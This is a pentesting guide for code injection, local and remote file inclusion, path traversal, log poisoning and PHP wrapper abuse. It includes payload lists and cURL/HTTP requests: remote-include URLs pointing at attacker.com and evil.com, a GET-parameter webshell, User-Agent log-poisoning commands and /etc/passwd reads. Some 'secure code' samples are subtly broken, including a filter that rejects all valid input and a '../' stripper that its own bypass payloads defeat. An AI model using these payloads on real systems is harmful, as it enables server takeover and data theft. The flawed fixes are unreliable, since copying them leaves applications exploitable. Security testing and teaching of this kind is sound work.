# Testing for Code Injection, Local File Inclusion, and Remote File Inclusion Vulnerabilities

## Overview

Testing for Code Injection, Local File Inclusion (LFI), and Remote File Inclusion (RFI) vulnerabilities involves verifying that a web application properly sanitizes user input to prevent attackers from executing arbitrary code, accessing local server files, or including malicious remote files. According to OWASP (WSTG-INPV-011), these vulnerabilities occur when untrusted input is processed without validation, enabling attackers to manipulate application logic, access sensitive data, or gain unauthorized server access. This guide provides a hands-on methodology to test for Code Injection, LFI, and RFI vulnerabilities, focusing on input vectors, code injection, LFI, RFI, path traversal, log file poisoning, and wrapper protocol abuse, with tools, commands, payloads, and remediation strategies.

**Impact**: These vulnerabilities can lead to:
- Arbitrary code execution (e.g., running malicious PHP scripts).
- Unauthorized access to server files (e.g., `/etc/passwd` via LFI).
- Remote code execution via malicious scripts (RFI).
- Exposure of sensitive data or server configuration.
- Non-compliance with security standards (e.g., PCI DSS, GDPR).

This guide aligns with OWASP’s WSTG-INPV-011, offering black-box and gray-box testing steps, beginner-friendly tool setups, specific commands, and ethical considerations. 

**Ethical Note**: Obtain explicit permission before testing, as these attacks may execute harmful code, access restricted files, or disrupt server operations.

## Testing Tools

The following tools are recommended for testing Code Injection, LFI, and RFI vulnerabilities, with setup instructions optimized for new pentesters:

- **Burp Suite Community Edition**: Intercepts and modifies HTTP requests to inject payloads.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: `127.0.0.1:8080` (Firefox recommended).
  - Use Repeater to test payloads and Proxy > HTTP History to identify input vectors.
  - **Note**: Check responses for code execution or file content.

- **OWASP ZAP 3.0**: A free tool for automated and manual injection testing.
  - Download from [ZAP](https://www.zaproxy.org/download/).
  - Configure browser proxy: `127.0.0.1:8080`.
  - Enable HUD (Heads-Up Display):
    1. Go to Tools > Options > HUD.
    2. Enable HUD for in-browser testing.
  - Use Active Scan with LFI/RFI rules; manually verify findings.

- **cURL and HTTPie**: Send HTTP requests with injection payloads.
  - **cURL**:
    - Install on Linux:
      ```bash
      sudo apt install curl
      ```
    - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
  - **HTTPie** (beginner-friendly):
    - Install on Linux/Mac:
      ```bash
      sudo apt install httpie
      ```
    - Install on Windows: `pip install httpie`.
    - Example:
      ```bash
      # cURL
      curl -i "http://example.com/page?file=../../etc/passwd"
      # HTTPie
      http "http://example.com/page?file==../../etc/passwd"
      ```

- **Postman**: GUI tool for testing injection in APIs or forms.
  - Download from [Postman](https://www.postman.com/downloads/).
  - Send payloads in query parameters or body.
  - **Tip**: Use Collections for batch testing.

- **Browser Developer Tools (Chrome/Firefox)**: Inspects responses to injection payloads.
  - Access: Press `F12` or `Ctrl+Shift+I`.
  - Use Network tab to analyze responses and Elements tab for file or code output.
  - **Note**: Firefox’s 2025 network analysis improvements enhance response inspection.

- **Netcat (nc)**: Tests server responses for RFI or code execution.
  - Install on Linux:
    ```bash
    sudo apt install netcat
    ```
  - Install on Windows/Mac: Download from [nmap.org](https://nmap.org/ncat/).
  - Example:
    ```bash
    echo -e "GET /page?file=http://attacker.com/malicious.php HTTP/1.1\nHost: example.com\n\n" | nc example.com 80
    ```

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-INPV-011, testing Code Injection, LFI, and RFI vulnerabilities across input vectors, code injection, LFI, RFI, path traversal, log file poisoning, and wrapper protocol abuse.

### Common Code Injection, LFI, and RFI Payloads

Below is a list of common payloads to test for Code Injection, LFI, and RFI vulnerabilities. Start with simple payloads and escalate based on responses. Use with caution in controlled environments to avoid unintended consequences.

- **Code Injection Payloads**:
  - `<?php phpinfo(); ?>` (Executes PHP code)
  - `system('whoami');` (Runs system command)
  - `eval('print("test");');` (Evaluates PHP code)
  - `;id` (Appends command in input)

- **LFI Payloads**:
  - `../../etc/passwd` (Accesses local file)
  - `/etc/passwd` (Direct file path)
  - `....//....//etc/passwd` (Bypasses filters)
  - `%2e%2e%2fetc%2fpasswd` (URL-encoded)

- **RFI Payloads**:
  - `http://attacker.com/malicious.php` (Includes remote script)
  - `https://evil.com/shell.txt` (Includes remote file)
  - `ftp://attacker.com/script.php` (Alternative protocol)
  - `http://attacker.com/malicious.php%00` (Null byte bypass)

- **Path Traversal Payloads**:
  - `../` (Moves up directory)
  - `..%2f` (URL-encoded traversal)
  - `....//` (Filter bypass)
  - `%c0%af` (Unicode-encoded slash)

- **Log Poisoning Payloads**:
  - `User-Agent: <?php system('whoami'); ?>` (Injects code into logs)
  - `../../var/log/apache2/access.log` (Includes poisoned log file)
  - `../../var/log/nginx/access.log` (Alternative log file)
  - `<?php system($_GET['cmd']); ?>` (Injects webshell code)

- **Wrapper Protocol Payloads**:
  - `php://filter/convert.base64-encode/resource=../../etc/passwd` (LFI base64 output)
  - `data://text/plain,<?php phpinfo(); ?>` (RFI inline code)
  - `expect://whoami` (Command execution via wrapper)
  - `php://input` (Reads POST data)

**Note**: Payloads depend on the server (e.g., PHP, Apache) and configuration (e.g., `allow_url_include` for RFI). Test payloads in URL parameters, form fields, or headers where input is processed.

### 1. Identify Input Vectors

**Objective**: Locate user-controllable inputs that may be processed by the application for code execution or file inclusion.

**Steps**:
1. Browse the website:
   - Visit the target (e.g., `http://example.com`).
   - Identify forms, URL parameters, or APIs that may process files or code (e.g., `page.php?file=home`).
2. Capture requests with Burp Suite:
   - Enable Intercept (Proxy > Intercept > On).
   - Submit forms or click links to capture requests in HTTP History.
   - Note parameters (e.g., `file=home`, `input=code`).
3. Inspect responses:
   - Check for file content, PHP errors, or code execution output.
   - Use Developer Tools (`Ctrl+Shift+I`) to search for included files or errors.
4. List input vectors:
   - Document query parameters, form fields, headers, and JSON payloads.

**Example Input Vectors**:
- URL: `http://example.com/page.php?file=home`
- Form: `<input name="script">`
- API: `POST /api` with `{"file": "config.php"}`

**Remediation**:
- Validate inputs with allowlists:
  ```php
  if (!in_array($_GET['file'], ['home', 'about'])) die("Invalid file");
  ```
- Disable dangerous functions:
  ```php
  disable_functions = eval,exec,system,passthru
  ```

**Tip**: Save the input vector list in a report.

### 2. Test for Code Injection

**Objective**: Verify if user input can execute arbitrary code on the server.

**Steps**:
1. Identify code-related inputs:
   - Look for fields or parameters that may process scripts (e.g., `?input=code`).
2. Inject payloads:
   - Use Burp Repeater:
     ```http
     GET /page?input=<?php phpinfo(); ?> HTTP/1.1
     Host: example.com
     ```
   - Use cURL:
     ```bash
     curl -i "http://example.com/page?input=<?php phpinfo(); ?>"
     ```
3. Check responses:
   - Look for code execution (e.g., `phpinfo()` output) or errors.
   - Test: `system('whoami');` or `;id`.
4. Test encoded payloads:
   - Try: `%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E`.

**Example Vulnerable Code (PHP)**:
```php
$input = $_GET['input'];
eval($input);
```
Test: `?input=phpinfo();`
Result: Displays PHP info.

**Example Secure Code (PHP)**:
```php
$input = preg_replace('/[^a-zA-Z0-9]/', '', $_GET['input']);
if (!empty($input)) die("Invalid input");
```
Test: No execution.

**Remediation**:
- Avoid dynamic code execution:
  ```php
  // Never use eval()
  ```
- Sanitize inputs:
  ```php
  $input = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
  ```

**Tip**: Save code execution evidence in a report.

### 3. Test for Local File Inclusion (LFI)

**Objective**: Check if user input can include local server files.

**Steps**:
1. Identify file-related inputs:
   - Look for parameters like `?file=home.php`.
2. Inject payloads:
   - Use Burp:
     ```http
     GET /page?file=../../etc/passwd HTTP/1.1
     Host: example.com
     ```
   - Use HTTPie:
     ```bash
     http "http://example.com/page?file==../../etc/passwd"
     ```
3. Check responses:
   - Look for file contents (e.g., `/etc/passwd`).
   - Test: `../../var/log/apache2/access.log`.
4. Test filter bypass:
   - Try: `....//etc/passwd` or `%2e%2e%2fetc%2fpasswd`.

**Example Vulnerable Code (PHP)**:
```php
$file = $_GET['file'];
include($file);
```
Test: `?file=../../etc/passwd`
Result: Displays `/etc/passwd`.

**Example Secure Code (PHP)**:
```php
$file = basename($_GET['file']);
if (in_array($file, ['home.php', 'about.php'])) {
    include($file);
} else {
    die("Invalid file");
}
```
Test: No file inclusion.

**Remediation**:
- Use basename to strip paths:
  ```php
  $file = basename($_GET['file']);
  ```
- Restrict file access:
  ```apache
  <Files ~ "\.(conf|log)$">
      Deny from all
  </Files>
  ```

**Tip**: Save included file contents in a report.

### 4. Test for Remote File Inclusion (RFI)

**Objective**: Verify if user input can include remote malicious files.

**Steps**:
1. Set up a malicious file:
   - Host `malicious.php` on `http://attacker.com` with `<?php phpinfo(); ?>`.
2. Inject payloads:
   - Use Burp:
     ```http
     GET /page?file=http://attacker.com/malicious.php HTTP/1.1
     Host: example.com
     ```
   - Use cURL:
     ```bash
     curl -i "http://example.com/page?file=http://attacker.com/malicious.php"
     ```
3. Check responses:
   - Look for remote code execution (e.g., `phpinfo()` output).
   - Test: `https://evil.com/shell.txt`.
4. Test null byte bypass:
   - Try: `http://attacker.com/malicious.php%00`.

**Example Vulnerable Code (PHP)**:
```php
$file = $_GET['file'];
include($file);
```
Test: `?file=http://attacker.com/malicious.php`
Result: Executes remote code.

**Example Secure Code (PHP)**:
```php
$file = basename($_GET['file']);
if (file_exists($file) && in_array($file, ['home.php'])) {
    include($file);
} else {
    die("Invalid file");
}
```
Test: No inclusion.

**Remediation**:
- Disable remote inclusion:
  ```php
  allow_url_include = Off
  ```
- Validate file paths:
  ```php
  if (!file_exists($file)) die("File not found");
  ```

**Tip**: Save remote execution evidence in a report.

### 5. Test for Path Traversal

**Objective**: Check if user input can manipulate file paths to access restricted directories.

**Steps**:
1. Inject traversal payloads:
   - Use Burp:
     ```http
     GET /page?file=../config.php HTTP/1.1
     Host: example.com
     ```
   - Use cURL:
     ```bash
     curl -i "http://example.com/page?file=../config.php"
     ```
2. Check responses:
   - Look for file contents or errors.
   - Test: `../../etc/passwd` or `..%2f..%2fetc%2fpasswd`.
3. Test filter bypass:
   - Try: `....//config.php` or `%c0%afetc/passwd`.
4. Use Burp Intruder:
   - Test multiple traversal depths (e.g., `../`, `../../`, `../../../`).

**Example Vulnerable Code (PHP)**:
```php
$file = $_GET['file'];
readfile($file);
```
Test: `?file=../config.php`
Result: Displays `config.php`.

**Example Secure Code (PHP)**:
```php
$file = str_replace('../', '', $_GET['file']);
if (file_exists("pages/$file")) {
    readfile("pages/$file");
} else {
    die("File not found");
}
```
Test: No access.

**Remediation**:
- Normalize paths:
  ```php
  $file = realpath($file);
  ```
- Restrict directory access:
  ```php
  if (strpos($file, '/etc/') !== false) die("Access denied");
  ```

**Tip**: Save traversal evidence in a report.

### 6. Test for Log File Poisoning

**Objective**: Exploit LFI vulnerabilities by injecting malicious code into server log files and including them to achieve code execution.

**Steps**:
1. Confirm LFI vulnerability (e.g., `?file=../../etc/passwd` works).
2. Inject malicious code into logs:
   - Send a request with a malicious User-Agent:
     ```bash
     curl -H "User-Agent: <?php system('whoami'); ?>" "http://example.com/"
     ```
   - Alternatively, inject via URL parameters if logged:
     ```bash
     curl "http://example.com/?cmd=<?php system('id'); ?>"
     ```
3. Include the log file:
   - Use Burp:
     ```http
     GET /page?file=../../var/log/apache2/access.log HTTP/1.1
     Host: example.com
     ```
   - Use cURL:
     ```bash
     curl -i "http://example.com/page?file=../../var/log/apache2/access.log"
     ```
4. Check responses for command output (e.g., `www-data`).

**Example Vulnerable Code (PHP)**:
```php
$file = $_GET['file'];
include($file);
```
Test: Inject `<?php system('whoami'); ?>` in User-Agent, then `?file=../../var/log/apache2/access.log`
Result: Executes `whoami`.

**Example Secure Code (PHP)**:
```php
$file = basename($_GET['file']);
if (file_exists("pages/$file")) {
    include("pages/$file");
} else {
    die("Invalid file");
}
```
Test: No execution.

**Remediation**:
- Restrict log file access:
  ```apache
  <Files ~ "\.log$">
      Deny from all
  </Files>
  ```
- Sanitize log inputs:
  ```php
  $user_agent = filter_var($_SERVER['HTTP_USER_AGENT'], FILTER_SANITIZE_STRING);
  ```
- Use non-executable log directories.

**Tip**: Save executed command output in a report.

### 7. Test for Wrapper Protocol Abuse

**Objective**: Verify if LFI or RFI vulnerabilities can exploit PHP wrapper protocols to access files or execute code.

**Steps**:
1. Identify LFI or RFI-vulnerable parameters.
2. Inject wrapper payloads:
   - For LFI:
     - Use Burp:
       ```http
       GET /page?file=php://filter/convert.base64-encode/resource=../../etc/passwd HTTP/1.1
       Host: example.com
       ```
     - Use cURL:
       ```bash
       curl -i "http://example.com/page?file=php://filter/convert.base64-encode/resource=../../etc/passwd"
       ```
   - For RFI:
     - Use Burp:
       ```http
       GET /page?file=data://text/plain,<?php phpinfo(); ?> HTTP/1.1
       Host: example.com
       ```
3. Check responses:
   - LFI: Decode base64 output to reveal file contents.
   - RFI: Look for code execution (e.g., `phpinfo()`).
4. Test other wrappers:
   - `expect://whoami`, `php://input` with POST data.

**Example Vulnerable Code (PHP)**:
```php
$file = $_GET['file'];
include($file);
```
Test: `?file=php://filter/convert.base64-encode/resource=../../etc/passwd`
Result: Returns base64-encoded `/etc/passwd`.

**Example Secure Code (PHP)**:
```php
$file = basename($_GET['file']);
if (preg_match('/^(php|data|expect):\/\//', $file)) die("Invalid file");
if (file_exists("pages/$file")) {
    include("pages/$file");
}
```
Test: No inclusion.

**Remediation**:
- Disable unsafe wrappers:
  ```php
  allow_url_include = Off
  ```
- Validate file paths:
  ```php
  if (strpos($file, 'php://') !== false) die("Invalid file");
  ```
- Restrict protocols:
  ```php
  stream_wrapper_unregister('php');
  ```

**Tip**: Save wrapper outputs in a report.
